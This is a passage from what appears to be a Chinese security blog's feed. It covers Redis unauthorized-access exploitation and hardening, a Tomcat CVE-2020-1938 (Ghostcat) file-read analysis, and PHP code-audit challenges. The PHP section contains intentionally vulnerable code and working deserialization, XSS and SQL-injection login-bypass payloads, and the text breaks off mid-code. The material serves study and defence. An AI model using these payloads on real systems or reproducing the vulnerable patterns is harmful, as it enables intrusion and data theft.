C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/redis-rogue-getshell</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315162822651.png" alt></p><h2 id="历史CVE-1"><a href="#历史CVE-1" class="headerlink" title="历史CVE"></a>历史CVE</h2><h3 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h3><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p><h3 id="CVE-2015-8080-1"><a href="#CVE-2015-8080-1" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h3><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p><h3 id="CVE-2015-4335-1"><a href="#CVE-2015-4335-1" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h3><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p><h3 id="CVE-2013-7458-1"><a href="#CVE-2013-7458-1" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h3><p>读取”.rediscli_history”配置文件信息。</p><h2 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>首先设置一个临时的密码：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315163458809.png" alt="image-20200315163458809"></p><p>使用hydra暴力破解：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/Redis/image-20200315163854694.png" alt="image-20200315163854694"></p><h2 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h2><ul><li>Redis服务端口禁止在公网开发</li><li>配置Redis的访问密码，复杂度要高。。</li><li>以低权限运行Redis服务，禁止用root等最高权限运行；</li><li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://segmentfault.com/a/1190000016188385</span><br><span class="line">https://damit5.com/2018/05/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Redis服务的默认端口是6379，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Redis" scheme="https://www.sys71m.top/categories/Redis/"/>
    
    
      <category term="Redis" scheme="https://www.sys71m.top/tags/Redis/"/>
    
      <category term="未授权访问" scheme="https://www.sys71m.top/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
  </entry>
  
  <entry>
    <title>Apache Tomcat漏洞分析及复现(CVE-2020-1938)</title>
    <link href="https://www.sys71m.top/2020/02/22/Apache%20Tomcat%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0(CVE-2020-1938)/"/>
    <id>https://www.sys71m.top/2020/02/22/Apache%20Tomcat%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0(CVE-2020-1938)/</id>
    <published>2020-02-22T12:15:10.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>这两天Apache Tomcat爆出来的新漏洞，CVE-2020-1938，可远程读取web服务器下的文件，危害较大。</p><a id="more"></a>  <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Tomcat 6.*</li><li>Tomcat 7.* &lt; 7.0.100</li><li>Tomcat 8.* &lt; 8.5.51</li><li>Tomcat 9.* &lt; 9.0.31</li></ul><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache Tomcat默认启用了AJP协议，<code>server.xml</code>中配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">&lt;!-- A "Connector" represents an endpoint by which requests are received</span></span><br><span class="line"><span class="comment">         and responses are returned. Documentation at :</span></span><br><span class="line"><span class="comment">         Java HTTP Connector: /docs/config/http.html</span></span><br><span class="line"><span class="comment">         Java AJP  Connector: /docs/config/ajp.html</span></span><br><span class="line"><span class="comment">         APR (HTTP/AJP) Connector: /docs/apr.html</span></span><br><span class="line"><span class="comment">         Define a non-SSL/TLS HTTP/1.1 Connector on port 8080</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">redirectPort</span>=<span class="string">"8443"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Define an AJP 1.3 Connector on port 8009 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8009"</span> <span class="attr">protocol</span>=<span class="string">"AJP/1.3"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>第一个连接器监听8080端口，负责建立HTTP连接。在通过浏览器访问Tomcat服务器的Web应用时，使用的就是这个连接器。</p><p>第二个连接器监听8009端口，负责和其他的HTTP服务器建立连接。在把Tomcat与其他HTTP服务器集成时，就需要用到这个连接器。AJP连接器可以通过AJP协议和一个web容器进行交互。</p><p>攻击者通过AJP协议端口利用该漏洞进行文件读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件、源代码等。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="Apache-Tomcat-9-0-20"><a href="#Apache-Tomcat-9-0-20" class="headerlink" title="Apache Tomcat/9.0.20"></a>Apache Tomcat/9.0.20</h3><p>因之前电脑上下载过tomcat，版本也在漏洞影响范围之内，直接拿来验证，在<code>bin/start.bat</code>启动服务。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/image-20200222104320230.png" alt="image-20200222104320230"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hypn0s/AJPy</span><br></pre></td></tr></table></figure><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tomcat.py read_file --webapp=manager /secret.txt <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/image-20200222120327269.png" alt="image-20200222120327269"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="源码下载"><a href="#源码下载" class="headerlink" title="源码下载"></a>源码下载</h3><p>Apache Tomcat v9.0.20源码下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://archive.apache.org/dist/tomcat/tomcat-9/v9.0.20/src/</span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>追踪到<code>java\org\apache\coyote\ajp\AjpProcessor.java</code>类，tomcat官网解释如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public class AjpAprProcessor</span><br><span class="line">extends java.lang.Object</span><br><span class="line">implements ActionHook</span><br><span class="line">Processes HTTP requests.</span><br></pre></td></tr></table></figure><p>在<code>AjpProcessor.java</code>类中定位到<code>prepareRequest()</code>函数，此函数作用为一个请求删选器。接着来到代码704行左右：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ%E6%88%AA%E5%9B%BE20200222171456.png" alt></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ%E6%88%AA%E5%9B%BE20200222162225.png" alt></p><p>可以看到，当属性值不等于<code>Constants.SC_A_ARE_DONE</code>时会进入判断，为<code>Constants.SC_A_REQ_ATTRIBUTE</code>时，接着进行<code>if-else</code>的判断，当没有匹配结果时，最终传入<code>request.setAttribute()</code>函数，各种属性值如下图：</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ%E6%88%AA%E5%9B%BE20200222171202.png" alt="QQ截图20200222171202"></p><p>因此我们可以进行对Ajp设置特定的属性，封装为request对象的Attribute属性，比如以下三个属性可以被设置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br></pre></td></tr></table></figure><h3 id="读取文件-1"><a href="#读取文件-1" class="headerlink" title="读取文件"></a>读取文件</h3><p>在<code>java\org\apache\catalina\servlets\DefaultServlet.java</code>类中，<code>service</code>函数调用<code>doGet</code>方法处理request和response。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ%E6%88%AA%E5%9B%BE20200222184059.png" alt="QQ截图20200222184059"></p><p><code>doGet</code>调用<code>serverResource</code>，在<code>serverResource</code>函数中读取request中的path，接着直接调用了<code>resources.getResource()</code>函数读取。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ%E6%88%AA%E5%9B%BE20200222184458.png" alt="QQ截图20200222184458"></p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ截图20200222184640.png" alt="QQ截图20200222184640">)</p><p>跟进<code>getRelativePath</code>函数，看下是如何获取路径以及是否存在过滤，只要获取到<code>request_uri</code>不为<code>null</code>，然后从<code>request</code>对象中获取并设置<code>pathInfo</code>属性值和<code>servletPath</code>属性值。</p><p><img src="https://raw.githubusercontent.com/ttonys/MarkDownPic/master/tomcat/QQ截图20200222195042.png" alt="QQ截图20200222195042"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/199448</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这两天Apache Tomcat爆出来的新漏洞，CVE-2020-1938，可远程读取web服务器下的文件，危害较大。&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaSec" scheme="https://www.sys71m.top/categories/JavaSec/"/>
    
    
      <category term="Tomcat" scheme="https://www.sys71m.top/tags/Tomcat/"/>
    
      <category term="Apache" scheme="https://www.sys71m.top/tags/Apache/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计(二)</title>
    <link href="https://www.sys71m.top/2020/02/14/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)/"/>
    <id>https://www.sys71m.top/2020/02/14/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)/</id>
    <published>2020-02-14T14:04:41.000Z</published>
    <updated>2020-11-04T23:46:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>RIPS Technologies2017代码审计的第二篇。</p><a id="more"></a>  <h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">  <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">    $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">    $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">    file_put_contents($file, $tpl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">      htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中需要修改的一点：正则<code>/O:\d:\/</code>改为<code>/O:\d:/</code>。</p><p>代码中存在反序列化的点，但反序列化前进行了过滤，开头的前两位必须不为<code>O:8</code>，并且不许存在<code>O:数字:</code>这样的序列化数据存在。先说一下这样过滤的意义，在php的序列化数据中，a代表array，s代表string，b代表bool，而数字代表个数/长度，o代表一个对象。因此这样就无法对已经序列化的对象进行反序列化，从而预防了任意对象反序列化的危害。</p><p>但是对于第一个过滤，可以采用数组的方式绕过，测试如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="number">1</span>,<span class="string">"pass"</span>=&gt;<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> var_dump(serialize($test));</span><br><span class="line"><span class="comment">#string'a : 2 :&#123;s : 4 : "user" ; i : 1 ; s : 4 : "pass" ; i : 1 ;&#125;</span></span><br></pre></td></tr></table></figure><p>对于第二个过滤规则，只需要在对象长度前添加一个+号，原理参考如下文章：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.phpbug.cn/archives/32.html</span></span><br></pre></td></tr></table></figure><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/var/www/html/config.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mytemp = <span class="keyword">new</span> Template();</span><br><span class="line">$myarray = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'test'</span>,$mytemp);</span><br><span class="line">$myarray = serialize($myarray);</span><br><span class="line">var_dump($myarray);</span><br><span class="line"><span class="comment">#a:2:&#123;s:4:"name";s:4:"test";i:0;O:8:"Template":2:&#123;s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"&lt;?php phpinfo();";&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>需要将<code>0:8</code>变为<code>0:+8</code></p><h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">  htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中对输入的字符进行处理后最终反馈到前端页面上，其中对value进行了<code>intval</code>处理，但忽略了对key的处理，接下来重要的就是要绕过<code>htmlentities</code>，手册上解释如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(&quot;default_charset&quot;) [, bool $double_encode = true ]]] ) : string</span><br><span class="line">本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体的字符。</span><br><span class="line"></span><br><span class="line">如果要解码（反向操作），可以使用 html_entity_decode()。</span><br></pre></td></tr></table></figure><p><code>htmlentities</code>默认情况下不会对单引号进行转义。</p><h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%27onclick%3Dalert%281%29%2f%2f=1</span><br></pre></td></tr></table></figure><h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $em;</span><br><span class="line">  <span class="keyword">private</span> $user;</span><br><span class="line">  <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">    $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">      -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">      -&gt;where(<span class="string">"user = '$user' AND password = '$pass'"</span>);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">    $input = addslashes($input);</span><br><span class="line">    <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">      $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中通过<code>addslashes</code>函数试图阻止sql危害的产生，函数解释如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addslashes ( string $str ) : string</span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&apos;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）。</span><br></pre></td></tr></table></figure><p>代码中对所输入的长度进行了最长为20的限制，利用这个限制，我们可以构造经过转义后长度大于20的字符串，经过<code>substr</code>函数的截断，逃逸出<code>\</code>，测试如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(substr(addslashes(<span class="string">"123456789123456789'"</span>),<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">string(<span class="number">20</span>) <span class="string">"123456789123456789\'"</span></span><br><span class="line">php &gt; var_dump(substr(addslashes(<span class="string">"1234567890123456789'"</span>),<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">string(<span class="number">20</span>) <span class="string">"1234567890123456789\"</span></span><br></pre></td></tr></table></figure><h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>构造如下paylod：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1234567890123456789&apos;&amp;passwd=or 1=1#</span><br></pre></td></tr></table></figure><p>最终在where语句处查询的最终表达式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user = &apos;1234567890123456789\&apos; AND password = &apos;or 1=1#&apos;</span><br></pre></td></tr></table></figure><p>返回结构始终为true。</p><h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><h3 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $id;</span><br><span class="line">  <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = rand(<span 